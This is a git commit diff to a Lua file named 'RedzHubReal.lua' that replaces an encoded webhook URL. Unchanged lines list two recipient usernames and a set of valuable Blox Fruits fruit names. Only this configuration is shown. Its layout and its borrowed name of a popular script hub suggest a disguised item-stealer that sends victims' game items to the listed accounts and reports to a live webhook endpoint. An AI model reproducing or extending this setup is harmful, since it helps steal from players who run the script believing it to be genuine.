05a45a7aca3cf7e5c93db652b105e1ac397a9da9
redzhubreal <sigma123alpha123beta123@gmail.com>
2025-03-09 15:48:31 +0530

    Update RedzHubReal.lua

--- RedzHubReal.lua
+++ RedzHubReal.lua
@@ -1,4 +1,4 @@
-Webhook = "https://webhook-protect.vercel.app/api/webhook?id=UmNhYm0zT003UzhIdG1qc1AxU1FYQTpsa1RNUmhOUHZ0TzdIQnMtZGlPalhBbVhtMkEtSm44RzAyZjQ5ZmNjeVdMSnZRQzFlQ3FXWl9UWmxkNDcxZkJ4MUJHVGE4dUFOdmFFa1Q3NjVZVzljZC11bS04bkVmbGFTLXgzX0VqRjU0MVRCcFJYRGNCeEh5b3JmQU5PZkNUdWNITVd5ZWludmtiX1dfaHBVcUxrdGpCTmlRR2Eya0NwekZZMTd6MkJRZmM"
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=OWVlYUl4QUs0NHluY1RGakxlVVZwdzp0N0x1X2FZekNMcWstSFhHS19lcUktQUZydVFjUjVtdVhNWEVUQ0pESWYtSTdmX3JfcmhXdGc4aTg3b3VJNzRsdmVHRFRZQU1yalFrekN4MzdQbUJHLTE2bzd4bGNreXJFQlNJdm93cVZ4TmhtSlI4eVZMcWFOSklHNDNxend3QndlUVAxdGt6R3cxdHRXRGNKcTlVMTFnRW1qNGJkcmd3SmV6bXBBckVBcGM"
 Usernames = {"Sourlas3103", "cheesesato2"}
 FruitsToHit = {"Diamond-Diamond", "Light-Light", "Rubber-Rubber", "Quake-Quake", "Buddha-Buddha", "Sound-Sound", "Portal-Portal", "Rumble-Rumble", "Pain-Pain", "Blizzard-Blizzard", "Gravity-Gravity", "Mammoth-Mammoth", "T-Rex-T-Rex", "Shadow-Shadow", "Dough-Dough", "Venom-Venom", "Control-Control", "Leopard-Leopard", "Spirit-Spirit", "Gas-Gas", "Yeti-Yeti", "Kitsune-Kitsune"}
 
